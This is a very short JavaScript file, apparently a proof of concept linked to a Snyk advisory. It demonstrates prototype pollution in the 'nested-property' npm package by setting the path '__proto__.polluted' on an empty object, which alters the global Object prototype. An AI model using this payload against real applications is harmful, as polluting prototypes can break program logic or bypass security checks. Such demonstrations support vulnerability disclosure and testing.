//https://snyk.io/ 

 
  const nestedProperty = require("nested-property");
  const object1 = {};
   
  nestedProperty.set(object1, "__proto__.polluted", "yes");
// End of file
